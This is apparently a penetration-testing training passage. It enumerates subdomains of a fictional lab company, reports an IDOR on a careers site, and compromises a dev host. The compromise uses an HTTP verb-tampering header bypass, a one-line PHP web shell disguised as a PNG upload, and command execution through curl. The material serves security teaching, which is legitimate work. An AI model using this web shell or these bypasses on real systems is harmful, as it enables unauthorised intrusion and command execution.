# Web Enumeration & Exploitation

As mentioned in the previous section, web applications are where we usually spend most of our time during an External Penetration Test. They often present a vast attack surface and can suffer from many classes of vulnerabilities that can lead to remote code execution or sensitive data exposure, so we should be thorough with them. One thing to remember is that there is a difference between a `Web Application Security Assessment (WASA)` and an `External Penetration Test`. In a WASA, we are typically tasked with finding and reporting any and all vulnerabilities, no matter how mundane (i.e., a web server version in the HTTP response headers, a cookie missing the Secure or HttpOnly flag, etc.). We don't want to get bogged down with these types of findings during an External Penetration Test since we typically have a lot of ground to cover. The Scope of Work (SoW) document should clearly differentiate between the two assessment types. It should explicitly state that during an External Penetration Test, we will perform `cursory` web application testing, looking for high-risk vulnerabilities. If we don't have many findings at all, we can dig into the web applications deeper, and we can always include a catch-all `Best Practice Recommendation` or `Informational` finding that lists out several common security-related HTTP response header issues that we see all the time, among other minor issues. This way, we've fulfilled the contract by going after the big issues such as SQL injection, unrestricted file upload, XSS, XXE, file inclusion attacks, command injections, etc., but covered ourselves with the informational finding in case the client comes back asking why we didn't report X.

***

## Web Application Enumeration

The quickest and most efficient way to get through a bunch of web applications is using a tool such as [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) to take screenshots of each web application as covered in the `Attacking Common Applications` module in the [Application Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1088) section. This is particularly helpful if we have a massive scope for our assessment and browsing each web application one at a time is not feasible. In our case, we have `11` subdomains/vhosts (for now), so it's worth firing up EyeWitness to help us out as we want to be as efficient as possible to give the client the best possible assessment. This means speeding up any tasks that can be performed `faster` and more efficiently `without the possibility of missing things`. Automation is great, but if we're missing half of whatever we're going after, then the automation is doing more harm than good. Make sure you understand what your tools are doing, and periodically spot-check things to ensure your tools and any custom scripts are working as expected.

```shell-session
$ cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

We can feed EyeWitness an Nmap .xml file or a Nessus scan, which is useful when we have a large scope with many open ports, which can often be the case during an Internal Penetration Test. In our case, we'll just use the `-f` flag to give it the list of subdomains in a text file we enumerated earlier.

```shell-session
$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (11 Hosts)
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Attempting to screenshot http://careers.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://gitlab.inlanefreight.local
Attempting to screenshot http://ir.inlanefreight.local
Attempting to screenshot http://status.inlanefreight.local
Attempting to screenshot http://support.inlanefreight.local
Attempting to screenshot http://tracking.inlanefreight.local
Attempting to screenshot http://vpn.inlanefreight.local
Attempting to screenshot http://monitoring.inlanefreight.local
Finished in 34.79010033607483 seconds

[*] Done! Report written in the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
n
```

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

The EyeWitness results show us multiple very interesting hosts, any one of which could potentially be leveraged to gain a foothold into the internal network. Let's work through them one by one.

***

## blog.inlanefreight.local

First up is the `blog.inlanefreight.local` subdomain. At first glance, it looks promising. The site seems to be a forgotten Drupal install or perhaps a test site that was set up and never hardened. We can consult the [Drupal - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1089) of the `Attacking Common Applications` module for ideas.

<figure><img src="../../../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

Using `cURL`, we can see that Drupal 9 is in use.

```shell-session
$ curl -s http://blog.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

A quick Google search shows us that the current stable Drupal version intended for production is [release 9.4](https://www.drupal.org/project/drupal/releases), so we probably will have to get lucky and find some sort of misconfiguration such as a weak admin password to abuse built-in functionality or a vulnerable plugin. Well-known vulnerabilities such as `Drupalgeddon 1-3` do not affect version 9.x of Drupal, so that's a dead-end. Trying to log in with a few weak password combinations such as `admin:admin`, `admin:Welcome1`, etc., do not bear fruit. Attempting to register a user also fails, so we move on to the next application.

We could note in our report that this Drupal instance looks like it's not in use and could be worth taking down to further reduce the overall external attack surface.

***

## careers.inlanefreight.local

Next up is the careers subdomain. These types of sites often allow a user to register an account, upload a CV, and potentially a profile picture. This could be an interesting avenue of attack. Browsing first to the login page `http://careers.inlanefreight.local/login`, we can try some common authentication bypasses and try fuzzing the login form to try to bypass authentication or provoke some sort of error message or time delay that would be indicative of a SQL injection. As always, we test a few weak password combinations such as `admin:admin`. We should also always test login forms (and forgot password forms if they exist) for username enumeration, but none is apparent in this case.

The `http://careers.inlanefreight.local/apply` page allows us to apply for a job and upload a CV. Testing this functionality shows that it allows any file type to upload, but the HTTP response does not show where the file is located after upload. Directory brute-forcing does not yield any interesting directories such as `/files` or `/uploads` that could house a web shell if we can successfully upload a malicious file.

It's always a good idea to test user registration functionality on any web applications we come across, as these can lead to all sorts of issues. In the HTB box [Academy](https://0xdf.gitlab.io/2021/02/27/htb-academy.html), it is possible to register on a web application and modify our role to that of an admin at registration time. This was inspired by an actual External Penetration Test finding where I was able to register on an internet-facing web application for as many as five different user roles. Once logged into that application, all sorts of IDOR vulnerabilities existed, resulting in broken authorization on many pages.

Let's go ahead and register an account at `http://careers.inlanefreight.local/register` and look around. We register an account with bogus details: `test@test.com` and the credentials `pentester:Str0ngP@ssw0rd!`. Sometimes we'll need to use an actual email address to receive an activation link. We can use a disposable email service such as [10 Minute Mail](https://10minutemail.com/) not to clutter up our inbox or keep a dummy account with ProtonMail mail or similar just for testing purposes. You'll be happy you didn't use your actual email address the first time Burp Suite Active Scanner hits a form and sends you 1,000+ emails in rapid succession. Register with decently strong credentials, too. You don't want to introduce a security issue into the web application you're tasked with testing by registering with credentials such as `test:test` that could potentially be left on the application long after the test is over (though we should, of course, list in an appendix of our report any modifications made during testing, even registering on a public-facing website).

Once registered, we can log in and browse around. We're greeted with our profile page at `http://careers.inlanefreight.local/profile?id=9`. Attempting to fuzz the `id` parameter for SQLi, command injection, file inclusion, XSS, etc., does not prove fruitful. The ID number itself is interesting. Tweaking this number shows us that we can access other users' profiles and see what jobs they applied to. This is a classic example of an `Insecure Direct Object Reference (IDOR)` vulnerability and would definitely be worth reporting due to the potential for sensitive data exposure.

After exhausting all options here, we walk away with one decent reportable vulnerability to add to our findings list and move on to the next web application. We can use any directory brute-forcing tool here, but we'll go with [Gobuster](https://github.com/OJ/gobuster).

***

## dev.inlanefreight.local

The web application at `http://dev.inlanefreight.local` is simple yet catches the eye. Anything with `dev` in the URL or name is interesting, as this could potentially be accidentally exposed and riddled with flaws/not production-ready. The application presents a simple login form titled `Key Vault`. This looks like a homegrown password manager or similar and could lead to considerable data exposure if we can get in. Weak password combinations and authentication bypass payloads don't get us anywhere, so let's go back to the basics and look for other pages and directories. Let's try first with the `common.txt` wordlist using `.php` file extensions for the first run.

```shell-session
$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/20 22:04:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]                                            
/index.php            (Status: 200) [Size: 2048]                                            
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]    
/server-status        (Status: 403) [Size: 288]                                             
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]                                               
/.htaccess.php        (Status: 403) [Size: 288]                                              
                                                                                             
===============================================================
2022/06/20 22:05:02 Finished
===============================================================
```

We get a few interesting hits. The files with a `403` forbidden error code typically mean that the files exist, but the webserver doesn't allow us to browse to them anonymously. The `uploads` and `upload.php` pages immediately call our attention. If we're able to upload a PHP web shell, chances are we can browse right to it in the `/uploads` directory, which has directory listing enabled. We can note this down as a valid low-risk finding, `Directory Listing Enabled`, and capture the necessary evidence to make report writing quick and painless. Browsing to `/upload.php` gives us a `403 Forbidden` error message and nothing more, which is interesting because the status code is a `200 OK` success code. Let's dig into this deeper.

We'll need Burp Suite here to capture the request and see if we can figure out what's going on. If we capture the request and send it to Burp Repeater and then re-request the page using the `OPTIONS` method, we see that various methods are allowed: `GET,POST,PUT,TRACK,OPTIONS`. Cycling through the various options, each gives us a server error until we try the `TRACK` method and see that the `X-Custom-IP-Authorization:` header is set in the HTTP response. We can consult the [Web Attacks](https://academy.hackthebox.com/module/134/section/1159) modules on `HTTP Verb Tampering` for a refresher on this attack type.

<figure><img src="../../../../.gitbook/assets/image (412).png" alt=""><figcaption></figcaption></figure>

Playing around a bit with the request and adding the header `X-Custom-IP-Authorization: 127.0.0.1` to the HTTP request in Burp Repeater and then requesting the page with the `TRACK` method again yields an interesting result. We see what appears to be a file upload form in the HTTP response body.

<figure><img src="../../../../.gitbook/assets/image (413).png" alt=""><figcaption></figcaption></figure>

If we right-click anywhere in the `Response` window in `Repeater` we can select `show response in browser`, copy the resultant URL and request it in the browser we are using with the Burp proxy. A photo editing platform loads for us.

<figure><img src="../../../../.gitbook/assets/image (414).png" alt=""><figcaption></figcaption></figure>

We can click on the `Browse` button and attempt to upload a simple webshell with the following contents:

```php
<?php system($_GET['cmd']); ?>
```

Save the file as `5351bf7271abaa2267e03c9ef6393f13.php` or something similar. It's a good practice to create random file names when uploading a web shell to a public-facing website so a random attacker doesn't happen upon it. In our case, we'd want to use something password protected or restricted to our IP address since directory listing is enabled, and anyone could browse to the `/uploads` directory and find it. Attempting to upload the `.php` file directly results in an error: "`JPG, JPEG, PNG & GIF files are allowed.`", which shows that some weak client-side validation is likely in place. We can grab the POST request, send it to Repeater once again and try modifying the `Content-Type:` header in the request to see if we can trick the application into accepting our file as valid. We'll try altering the header to `Content-Type: image/png` to pass off our web shell as a valid PNG image file. It works! We get the following response: `File uploaded /uploads/5351bf7271abaa2267e03c9ef6393f13.php`.

We can now use `cURL` to interact with this web shell and execute commands on the web server.

```shell-session
$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking the host's IP addressing, it doesn't appear that we've landed inside the Inlanefreight internal network as the IP address is not within the internal network scope. This may just be a standalone web server, so we'll continue on.

```shell-session
$ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I

172.18.0.3
```

From here, we can enumerate the host further, looking for sensitive data, note down another two findings: `HTTP Verb Tampering` and `Unrestricted File Upload`, and move on to the next host.

***

## ir.inlanefreight.local

The next target in our list is `http://ir.inlanefreight.local`, the company's Investor Relations Portal hosted with WordPress. For this we can consult the [WordPress - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1100) section of the `Attacking Common Applications` module. Let's fire up `WPScan` and see what we can enumerate using the `-ap` flag to enumerate all plugins.
